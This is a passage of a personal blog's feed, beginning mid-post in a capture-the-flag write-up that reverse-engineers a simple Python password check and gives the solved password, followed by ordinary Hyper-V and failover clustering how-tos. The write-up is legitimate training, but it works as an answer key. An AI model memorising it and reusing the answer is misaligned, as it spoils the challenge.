    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Invalid args&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then ran it with the same letter 3 times.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@KaliOnWindows:~/Downloads# python Python1-test.py aaa
97
194
291

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Edited the test python to print the ord and the builder values through the characters&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Invalid args&quot;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Builder ='&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'-----'&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Ord ='&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'-----'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and output was beautifully&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@KaliOnWindows:~/Downloads# python Python1-test2.py aaa
Builder =
97
-----
Ord =
97
-----
Builder =
194
-----
Ord =
97
-----
Builder =
291
-----
Ord =
97
-----

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Added a print of length by throwing this into the for loop&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;print len(password)
print '-----'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now I came up with a random password that seemed to satisfy the conditions.&lt;/p&gt;

&lt;p&gt;I picked tSaaxaacaa. Not sure why. Ran it in our program.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@KaliOnWindows:~/Downloads# python Python1-test4.py tSaaxaacaa
Builder =
116
-----
Ord =
116
-----
10
-----
Builder =
199
-----
Ord =
83
-----
10
-----
Builder =
296
-----
Ord =
97
-----
10
-----
Builder =
393
-----
Ord =
97
-----
10
-----
Builder =
513
-----
Ord =
120
-----
10
-----
Builder =
610
-----
Ord =
97
-----
10
-----
Builder =
707
-----
Ord =
97
-----
10
-----
Builder =
806
-----
Ord =
99
-----
10
-----
Builder =
903
-----
Ord =
97
-----
10
-----
Builder =
1000
-----
Ord =
97
-----
10
-----

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It seemed to meet the conditions. Len was 10. The second character ord was 83 and we hit our goal of 1000.&lt;/p&gt;

&lt;p&gt;Run it in the PYTHON1.py program annnndddd.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@KaliOnWindows:~/Downloads# python PYTHON1.py tSaaxaacaa
correct

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay Done and Done. This took a little bit of time to run through but it was worth 150 points. Whew.&lt;/p&gt;

&lt;p&gt;Cheers,&lt;/p&gt;

&lt;p&gt;Zack&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">NCL Gym 2018 - Enumeration and Exploitation Python 1</summary></entry><entry><title type="html">Configuring Hyper V Networking</title><link href="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Hyper-V-Networking.html" rel="alternate" type="text/html" title="Configuring Hyper V Networking" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://hiimzackjones.github.io/server/2018/03/28/Configuring-Hyper-V-Networking</id><content type="html" xml:base="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Hyper-V-Networking.html">&lt;p&gt;Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.&lt;/p&gt;

&lt;h3 id=&quot;basic-hyper-v-networking&quot;&gt;Basic Hyper-V Networking&lt;/h3&gt;

&lt;p&gt;There are a couple of places you can Management parts of the virtual network. First, you will want to go to the Virtual Switch Settings in Hyper-V to be able to do basic switch configuration.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;In Hyper-V Manager, go to the actions bar and select the Hyper-V Switch Manager&lt;br /&gt;
&lt;img src=&quot;/assets/img/servergifs/hyperVN/1.PNG&quot; alt=&quot;HyperV Actions&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;In the switch manager, you should see any switches you’ve created, as well as the default switch. 
&lt;img src=&quot;/assets/img/servergifs/hyperVN/2.PNG&quot; alt=&quot;HyperV&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;here you can configure your switch to be external, internal, or private. As explained in another post…&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Private&lt;/em&gt; - isolation from the rest of the network, VMs on the same host can connect together with this setting. 
&lt;em&gt;Internal&lt;/em&gt; - Same as Private but can also communicate with the host as well.
&lt;em&gt;External&lt;/em&gt; - Faces the network like a physical machine.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Machines that are on Private or Internal networks will usually have to have their IP addresses set unless there is a DHCP server on a VM or on the host machine.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;If you’ve set up the switch as external, you will need to link it to an external switch if you’d like to allow it to get to the outside network or internet.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Once you’ve setup the switches, you should be able to access them to change their IP addresses and adjust some of their settings in your local machines network adapter list.&lt;br /&gt;
&lt;img src=&quot;/assets/img/servergifs/hyperVN/3.PNG&quot; alt=&quot;Network Adapters&quot; /&gt;&lt;br /&gt;
As you can see, there is a default switch, A switch with a custom name. And then individual switches most likely used as external switches for single VMs.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;changing-a-vms-switch&quot;&gt;Changing a VMs Switch&lt;/h3&gt;

&lt;p&gt;Changing the Virtual Switch you use can be handled in the VMs settings.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Head to the vm settings for the specific VM you’re working on within Hyper-V Manager&lt;/li&gt;
  &lt;li&gt;Under hardware there will be a Legacy Network Adapter section. Go there.&lt;/li&gt;
  &lt;li&gt;There you will see a drop down for the Vritual Switch you’d like to use. 
&lt;img src=&quot;/assets/img/servergifs/hypervSet/4.PNG&quot; alt=&quot;Selecting switch&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Once you’ve changed the settings you can apply the settings and quit out.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;nic-teaming&quot;&gt;NIC Teaming&lt;/h3&gt;
&lt;p&gt;Under the Legacy Network Adapter option in the Hyper-V Settings, you will see the dropdown for Advanced Features. Here you can add a handful of advanced features, one including NIC teaming. Select this if you want a NIC to be allow to be part of NIC teaming.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hyperVN/4.PNG&quot; alt=&quot;Nic Teaming&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s the basics!&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.</summary></entry><entry><title type="html">Configuring Virtual Machine Settings</title><link href="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Virtual-Machine-Settings.html" rel="alternate" type="text/html" title="Configuring Virtual Machine Settings" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://hiimzackjones.github.io/server/2018/03/28/Configuring-Virtual-Machine-Settings</id><content type="html" xml:base="http://hiimzackjones.github.io/server/2018/03/28/Configuring-Virtual-Machine-Settings.html">&lt;h2 id=&quot;setting-hyper-v-settings&quot;&gt;Setting Hyper-V settings&lt;/h2&gt;

&lt;p&gt;Hyper-V settings can be adjusted for each VM and will in essence adjust the aspects of the VM that would usually be physical components.&lt;/p&gt;

&lt;h3 id=&quot;hardware-options&quot;&gt;Hardware Options&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hypervSet/1.png&quot; alt=&quot;Hyper V Settings&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hyper-V settings feels similar to Device Manager and can be used to:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Set which harddrive VHD to use and adjust VHD settings&lt;/li&gt;
  &lt;li&gt;Set which NICs/ Virtual Switches to use
&lt;img src=&quot;/assets/img/servergifs/hypervSet/4.PNG&quot; alt=&quot;Network Switches&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Adjust available RAM&lt;/li&gt;
  &lt;li&gt;adjust the processor useage allocation&lt;/li&gt;
  &lt;li&gt;‘load’ a disk into the virtual disk drive
&lt;img src=&quot;/assets/img/servergifs/hypervSet/3.PNG&quot; alt=&quot;hyperv using an iso&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;These settings sometimes can only be adjusted when the machine is turned off, but for some settings can be adjusted as the machine is running. For example loading a local .iso as a Disk in the virtual Disk drive&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;management-options&quot;&gt;Management Options&lt;/h3&gt;

&lt;p&gt;You will also notice a section near the bottom of the left hand side that is called Managment. Here is a Hyper-V specific set of options for managing Hyper-V such as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;using a VM Heartbeat&lt;/li&gt;
  &lt;li&gt;Renaming the VM&lt;/li&gt;
  &lt;li&gt;Creating checkpoints and it’s file location&lt;/li&gt;
  &lt;li&gt;Automatic start and stop of VM&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hypervSet/2.PNG&quot; alt=&quot;Management Options&quot; /&gt;&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Setting Hyper-V settings</summary></entry><entry><title type="html">Implementing Failover Clustering</title><link href="http://hiimzackjones.github.io/server/2018/03/28/Implementing-Failover-Clustering.html" rel="alternate" type="text/html" title="Implementing Failover Clustering" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://hiimzackjones.github.io/server/2018/03/28/Implementing-Failover-Clustering</id><content type="html" xml:base="http://hiimzackjones.github.io/server/2018/03/28/Implementing-Failover-Clustering.html">&lt;h3 id=&quot;installing-the-failover-feature&quot;&gt;Installing the Failover Feature&lt;/h3&gt;
&lt;p&gt;To add this feature, in Server Manager go to Manage and Add Roles and Features. From the Features list select &lt;em&gt;Failover Clustering&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;validate-cluster-configuration&quot;&gt;Validate Cluster Configuration&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Go to Failover Clustering in the tools of Server Manager,&lt;/li&gt;
  &lt;li&gt;on the right side there will be a Actions panel where you can select &lt;em&gt;Validate Configuration&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Add the names of the servers in the text boxes and continue&lt;/li&gt;
  &lt;li&gt;then &lt;strong&gt;Run all Tests&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This will check to make sure the inventory, the stroage, the system configs, and Hyper-V is setup and ready for Clustering. Errors will show up in the &lt;strong&gt;Failover Cluster Report&lt;/strong&gt;&lt;br /&gt;
If there are any issues, use the report to help you sovle them before moving forward.&lt;/p&gt;

&lt;h3 id=&quot;creating-a-cluster&quot;&gt;Creating a Cluster&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;In the same actions pane, click create new cluster&lt;/li&gt;
  &lt;li&gt;select the first server and cluster and add&lt;/li&gt;
  &lt;li&gt;Name the cluster and type the IP address of the Cluster that we set up previously.&lt;/li&gt;
  &lt;li&gt;Finish&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Your cluster should show up in the Cluster’s tool section of the Server Manager.&lt;/p&gt;

&lt;h3 id=&quot;adding-a-shared-drive-to-the-cluster-iscsi&quot;&gt;Adding a shared Drive to the Cluster (iSCSI)&lt;/h3&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Installing the Failover Feature To add this feature, in Server Manager go to Manage and Add Roles and Features. From the Features list select Failover Clustering</summary></entry></feed>